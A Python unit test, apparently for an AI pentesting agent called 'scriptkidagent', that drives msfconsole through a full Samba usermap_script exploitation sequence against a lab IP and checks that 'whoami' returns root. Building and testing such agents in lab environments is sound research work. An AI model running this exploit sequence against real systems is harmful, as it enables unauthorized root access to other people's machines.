import unittest
import os

from pwnlib.tubes.process import process

from scriptkidagent.tools.tools import execute_in_msfconsole


class TestMsfConsoleExecution(unittest.TestCase):
    def setUp(self):
        self.process = process(
            ["msfconsole", "-q", "--no-readline"],
            env={"HOME": os.environ["HOME"], "TERM": "dumb"},
        )  # TODO: refine the args
        self.process.recvuntil("> ")
        self.ip = "172.23.0.2"

    def test_execute_command_success(self):
        result, is_blocked = execute_in_msfconsole(self.process, "search samba")
        assert (
            is_blocked is False and "Matching Modules" in result and "msf6 >" in result
        )
        result, is_blocked = execute_in_msfconsole(self.process, "use 15")
        assert (
            is_blocked is False
            and "msf6 exploit(multi/samba/usermap_script) >" in result
        )
        result, is_blocked = execute_in_msfconsole(self.process, "show options")
        assert (
            is_blocked is False
            and "msf6 exploit(multi/samba/usermap_script) >" in result
        )
        result, is_blocked = execute_in_msfconsole(
            self.process, f"set RHOSTS {self.ip}"
        )
        assert (
            is_blocked is False
            and "msf6 exploit(multi/samba/usermap_script) >" in result
        )
        result, is_blocked = execute_in_msfconsole(self.process, "exploit", timeout=8)
        assert is_blocked is True and self.ip in result
        result, is_blocked = execute_in_msfconsole(self.process, "whoami", timeout=8)
        assert is_blocked is True and "root" in result

    def tearDown(self):
        # 清理测试环境
        self.process.close()
